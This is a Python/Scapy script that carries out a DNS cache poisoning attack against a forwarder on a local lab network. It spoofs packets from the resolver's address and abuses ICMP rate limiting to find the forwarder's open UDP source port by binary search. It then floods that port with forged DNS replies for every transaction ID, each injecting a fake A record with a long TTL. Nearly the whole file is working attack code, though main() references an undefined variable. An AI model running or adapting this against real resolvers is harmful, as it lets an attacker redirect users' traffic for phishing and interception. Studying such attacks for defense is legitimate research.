import dns.resolver
import socket
from scapy.all import *
import random
import time
import threading
import collections
from ipaddress import IPv6Network, IPv6Address
from functools import wraps


forwarder_ip = '192.168.58.2'
forwarder_port = 53
resolver_ip = '192.168.58.3'
domain_name = "cool.com"
local_free_ip = []

ICMP_limit_rate = 200 # for freebsd
ICMP_recovering_time = .02 # 20 miliseconds
sleep_time_for_ICMP_refresh = .05 # 50 ms
wait_time_for_ICMP_reply = .05

MIN_PORT_TO_SCAN = 50000
MAX_PORT_TO_SCAN = 50600

fixed_src_port_for_attack = 9556

finished = 0

timeout_for_dns_query = 600

raw_dns_replies = None
pseudo_hdr = None

global_socket = conf.L2socket(iface='vboxnet2')


def milis_in_str(s):
    return str(round(s * 1000)) + ' ms'


#https://stackoverflow.com/a/58135538/3450691
# To count time elapsed by a function

PROF_DATA = collections.defaultdict(list)

def profile(fn):
    @wraps(fn)
    def with_profiling(*args, **kwargs):
        start_time = time.perf_counter()
        ret = fn(*args, **kwargs)
        elapsed_time = time.perf_counter() - start_time
        PROF_DATA[fn.__name__].append(elapsed_time)
        return ret
    return with_profiling

Metrics = collections.namedtuple("Metrics", "sum_time num_calls min_time max_time avg_time fname")

def print_profile_data():
    results = []
    for fname, elapsed_times in PROF_DATA.items():
        num_calls = len(elapsed_times)
        min_time = min(elapsed_times)
        max_time = max(elapsed_times)
        sum_time = sum(elapsed_times)
        avg_time = sum_time / num_calls
        metrics = Metrics(sum_time, num_calls, min_time, max_time, avg_time, fname)
        results.append(metrics)
    total_time = sum([m.sum_time for m in results])
    print("\t".join(["Percent", "Sum", "Calls", "Min", "Max", "Mean", "Function"]))
    for m in sorted(results, reverse=True):
        print("%.1f\t%.3f\t%d\t%.3f\t%.3f\t%.3f\t%s" % 
        (100 * m.sum_time / total_time, m.sum_time, m.num_calls, m.min_time, m.max_time, m.avg_time, m.fname))
    print ("%.3f Total Time" % total_time)

def clear_profile_data():
    global PROF_DATA
    PROF_DATA = {}


def initialize():
    # Initialize local_free_ip list
    local_ip_base = '192.168.58.'
    start = 5
    end = 254
    now = start
    while now <= end:
        local_free_ip.append(local_ip_base + str(now))
        now += 1
    #print (local_free_ip)
    #print (len(local_free_ip))

class Logger(object):
    def __init__(self):
        self.terminal = sys.stdout
        filehandle = open("logfile.log", "w")
        filehandle.close()
    
    def write(self, message):
        with open("logfile.log", "a", encoding='utf-8') as self.log:
            self.log.write(message)
        self.terminal.write(message)
    
    def flush(self):
        pass

def issue_dns_query(thread_id, lock):

    my_ip = '192.168.58.1'
    my_port = 9554

    ip_layer = IP(dst=forwarder_ip, src=my_ip)
    udp_layer = UDP(dport=forwarder_port, sport=my_port)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))

    packet = ip_layer / udp_layer / dns_layer

    lock.acquire()
    
    # Set value for timeout_for_dns_query carefully, because the lock will be acquired
    # for that amount of time if no dns response comes.
    ret = sr1(packet, timeout=timeout_for_dns_query, verbose=True)
    print (ret.show())

    lock.release()

    return

# We are going to use this for infering the actual source port also,
# that's why adding another parameter 'number_of_padding_packet'
@profile
def one_attack_burst(port_start, number_of_probe_packet, number_of_padding_packet):

    print("attack_burst: (port_start, # of probe, # of padding): " + str(port_start) + 
            ", " + str(number_of_probe_packet) +
            ", " + str(number_of_padding_packet))
    

    start_time = time.perf_counter()

    now_port = port_start

    # generate all probe packets, padding_packets (if any) and the verification packet first
    # and then send those in a burst
    probe_packet = []
    
    for i in range(number_of_probe_packet):
        ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
        udp_layer = UDP(dport=now_port, sport=RandShort())
        packet = Ether() / ip_layer / udp_layer
        probe_packet.append(raw(packet))
        now_port += 1

    padding_packet = []
    
    for i in range(number_of_padding_packet):
        ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
        udp_layer = UDP(dport=1, sport=RandShort())
        packet = Ether() / ip_layer / udp_layer
        padding_packet.append(raw(packet))

    ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = Ether() / ip_layer / udp_layer

    elapsed_time = time.perf_counter() - start_time
    #print ("Time needed for generating packets: " + milis_in_str(elapsed_time))


    attack_burst_start_time = time.perf_counter()

    start_time = time.perf_counter()
    for packet in probe_packet:
        global_socket.send(packet)
    for packet in padding_packet:
        global_socket.send(packet)
    elapsed_time = time.perf_counter() - start_time


    start_time = time.perf_counter()
    reply = global_socket.sr1(verification_packet, timeout=wait_time_for_ICMP_reply, verbose=False) # in seconds
    elapsed_time = time.perf_counter() - start_time

    attack_burst_end_time = time.perf_counter()
    elapsed_time_for_one_burst = attack_burst_end_time - attack_burst_start_time


    # TODO: optimize the sleeping time using the time needed to generate and send packets
    #if sleep_time_for_ICMP_refresh > elapsed_time_for_one_burst:
    #    time.sleep(sleep_time_for_ICMP_refresh - elapsed_time_for_one_burst)

    time.sleep(1) # 1 second is for FreeBSD
    # FreeBSD has a global ICMP rate limit for IP of 200 per second.

    # if either ICMP rate limit is drained or timeout occurs, the reply will be none
    if reply == None:
        print ("No port is open. IMCP rate limit is already drained.")
        return -1
    else:
        if reply.haslayer(ICMP):
            print("Yaaay, got ICMP port unreachable message. At least one port is open.")
            return port_start # important for the base condition of the binary search

    return 0

# dividing range into [left...mid] and [mid + 1...right]
def binary_search(left, right):
    mid = left + (right - left) // 2 #integer division

    # If this method is called for probing one port only
    if left == right:
        return one_attack_burst(left, 1, ICMP_limit_rate - 1)

    # First check on the left half of the range if there is an open port.
    # If yes (getting first port as the return value), continue binary search on this range
    ret1 = one_attack_burst(left, mid - left + 1, ICMP_limit_rate - (mid - left + 1))
    if ret1 == left:
        return binary_search(left, mid)

    # If there is no open port in the left half of the range, check if there is one on the other half
    # If yes, continue binary search on this range.
    ret2 = one_attack_burst(mid + 1, right - mid, ICMP_limit_rate - (right - mid))
    if ret2 == mid + 1:
        return binary_search(mid + 1, right)

    # If there is no open port on either half of the range, return -1.
    return -1

def find_the_exact_port(start_port, number_of_ports):
    ret = binary_search(start_port, start_port + number_of_ports - 1)
    if ret > 0:
        print ("\n\n\nopen port found in bin search : " + str(ret) + "\n\n\n")
    else:
        print ("no open port found in bin search : " + str(ret))
    return ret

def patch(dns_frame: bytearray, pseudo_hdr: bytes, dport: int):
    """Adjust the DNS port and patch the UDP checksum within the given Ethernet frame"""

    # set destination port
    dns_frame[36] = (dport >> 8) & 0xFF
    dns_frame[37] = dport & 0xFF

    # reset checksum
    dns_frame[40] = 0x00
    dns_frame[41] = 0x00

    # calc new checksum
    ck = checksum(pseudo_hdr + dns_frame[34:])
    if ck == 0:
        ck = 0xFFFF
    cs = struct.pack("!H", ck)
    dns_frame[40] = cs[0]
    dns_frame[41] = cs[1]
    return dns_frame

def prepare_dns_replies(port):
    dns_replies = []
    for txid in range(1024, 65536):
        
        dns_replies.append(
            Ether()
            / IP(dst=forwarder_ip, src=resolver_ip)
            / UDP(sport=53, dport=0)
            / DNS(id=txid, qr=1, qdcount=1, ancount=1, aa=1,
                    qd=DNSQR(qname=domain_name, qtype=0x0001, qclass=0x0001), # type A, class IN
                    an=DNSRR(rrname=domain_name, ttl=70000, rdata="123.123.123.123")) # Poisoning answer
        )

    raw_dns_replies = []
    for dns_reply in dns_replies:
        raw_dns_replies.append(bytearray(raw(dns_reply)))
    pseudo_hdr = struct.pack(
        "!4s4sHH",
        inet_pton(socket.AF_INET, dns_replies[0]["IP"].src),
        inet_pton(socket.AF_INET, dns_replies[0]["IP"].dst),
        socket.IPPROTO_UDP,
        len(raw_dns_replies[0][34:]),
    )
    return (raw_dns_replies, pseudo_hdr)

def flood_the_port_with_spoofed_dns_response(actual_port):
    global raw_dns_replies, pseudo_hdr
    
    start_time = time.perf_counter()

    for reply in raw_dns_replies:
        patch(reply, pseudo_hdr, actual_port)
        global_socket.send(reply)

    end_time = time.perf_counter()
    elapsed_time = end_time - start_time
    print ("time needed to sent all: " + milis_in_str(elapsed_time))

    return True

def search_for_open_udp_port_and_flood(thread_id, source_port_range_start, source_port_range_end, lock):
    #need to run this file with sudo because of port 53

    # Wait for the first thread to send the dns query first (aka, acruire the lock)
    while lock.locked() == False:
        None
    
    start = source_port_range_start

    # Try to search for open port until response is received on the first thread 
    # or we have searched all ports
    # TODO: correct the search range with proper condition [missing some ports on the end]
    while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:

        start_time_one_chunk = time.perf_counter()
        
        ret = one_attack_burst(start, ICMP_limit_rate, 0)

        if ret > 0: # got an ICMP reply

            # If there is an ICMP reply, try to find the exact port using binary search
            port = find_the_exact_port(start, ICMP_limit_rate)

            if port > 0: # found the port

                print ("--------------found the exact port.--------------")

                # Initiate flooding the target port with spoofed dns responses
                result = flood_the_port_with_spoofed_dns_response(port)
                if result == True:
                    global finished
                    finished = 1
                    return

        end_time_one_chunk = time.perf_counter()
        time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
        print ("time needed in this iteration of loop: " + milis_in_str(time_elapsed_for_one_chunk))

        start += ICMP_limit_rate

    print_profile_data()

    # Either actual dns response has been reached or tried all source ports
    return False

def main():

    # Initialize a list containing all local IPs possible
    initialize()

    # For generate an output file containing all the logs
    sys.stdout = Logger()

    print ('preparing spoofed replies.')
    global raw_dns_replies, pseudo_hdr
    raw_dns_replies, pseudo_hdr = prepare_dns_replies(port)
    print('spoofed replies prepared.')
    
    # Iteration indicates how many times we are trying to issue a query and find open port
    iteration = 1

    while finished == 0:

        time.sleep(2)

        print ("----------Iteration " + str(iteration) + " is starting.----------")

        lock = threading.Lock()

        t1 = threading.Thread(target=issue_dns_query, args=(2 * iteration - 1, lock))
        t1.start()

        t2 = threading.Thread(target=search_for_open_udp_port_and_flood, args=(2 * iteration,
                                MIN_PORT_TO_SCAN, MAX_PORT_TO_SCAN, lock))
        t2.start()

        # Hold the main thread to finish the second thread only.
        t2.join()
        
        print ("----------Iteration " + str(iteration) + " is completed.----------")

        iteration += 1

if __name__ == "__main__":
    main()